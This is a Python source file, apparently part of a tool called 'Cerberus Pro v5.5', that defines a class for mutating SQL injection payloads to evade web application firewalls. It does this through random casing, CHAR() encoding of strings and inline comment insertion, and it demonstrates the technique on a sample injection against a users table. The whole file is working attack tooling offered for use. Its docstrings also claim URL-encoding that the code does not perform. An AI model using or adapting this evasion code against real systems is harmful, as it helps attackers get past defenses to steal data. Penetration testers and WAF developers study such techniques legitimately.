import urllib.parse
import random
import re
from typing import Dict, Any

class PayloadEvader:
    """
    Cerberus Pro v5.5 - Dynamic Payload Evader
    Muta los payloads al vuelo para evadir Web Application Firewalls (WAFs) modernos
    basados en firmas clásicas y ML primitivo.
    """
    
    def __init__(self, aggressiveness: int = 1):
        """
        :param aggressiveness:
            1: Ligera (solo URLEncode)
            2: Media (Case manipulation, URLEncode saltado)
            3: Extrema (Doble URL, comentarios inyectados, hex)
        """
        self.aggressiveness = aggressiveness
        
    def _random_case(self, text: str) -> str:
        """Convierte caracteres aleatorios a mayúsculas o minúsculas respetando comillas."""
        # Evitamos alterar dentro de comillas simples para no romper literales
        parts = text.split("'")
        for i in range(0, len(parts), 2):
            parts[i] = ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in parts[i])
        return "'".join(parts)
        
    def _inject_comments(self, text: str) -> str:
        """Reemplaza espacios con comentarios SQL en línea para ofuscar."""
        # Only use SQL-level comment markers (NOT URL-encoded sequences)
        comments = ["/**/", "/* cerb */", "\t"]
        
        # Evitar alterar espacios dentro de comillas
        parts = text.split("'")
        for i in range(0, len(parts), 2):
            parts[i] = parts[i].replace(" ", random.choice(comments))
        return "'".join(parts)

    def _hex_encode_strings(self, text: str) -> str:
        """Convierte cadenas en comillas simples a notación CHAR() para evadir firmas de WAF."""
        import re
        def _to_char(match):
            s = match.group(1)
            char_vals = ",".join(str(ord(c)) for c in s)
            return f"CHAR({char_vals})"
        # Replace 'string' with CHAR(s,t,r,i,n,g)
        return re.sub(r"'([^']+)'", _to_char, text)

    def evade(self, payload: str, context: Dict[str, Any] = None) -> str:
        """
        Aplica las mutaciones SQL-level basadas en el nivel de agresividad.
        NOTA: NO hace URL-encoding. Eso lo maneja el cliente HTTP (httpx).
        """
        if not payload:
            return payload
            
        evaded = payload
        
        if self.aggressiveness >= 2:
            evaded = self._random_case(evaded)
            evaded = self._hex_encode_strings(evaded)
            
        if self.aggressiveness >= 3:
            evaded = self._inject_comments(evaded)

        # NO URL-encode here — httpx handles encoding when building the request.
        # Double-encoding (evader + httpx) was causing %252A gibberish and 404s.
        return evaded

if __name__ == "__main__":
    # Test rápido de evasiones
    raw_payload = "1' OR (SELECT COUNT(*) FROM users) > 0"
    print(f"RAW: {raw_payload}")
    
    evader_lv1 = PayloadEvader(1)
    print(f"LVL1 (URL Encode): {evader_lv1.evade(raw_payload)}")
    
    evader_lv2 = PayloadEvader(2)
    evaded_lv2 = evader_lv2.evade(raw_payload)
    print(f"LVL2 (Random Case + URL): {evaded_lv2}")
    
    evader_lv3 = PayloadEvader(3)
    evaded_lv3 = evader_lv3.evade(raw_payload)
    print(f"LVL3 (Extreme Obfuscation): {evaded_lv3}")
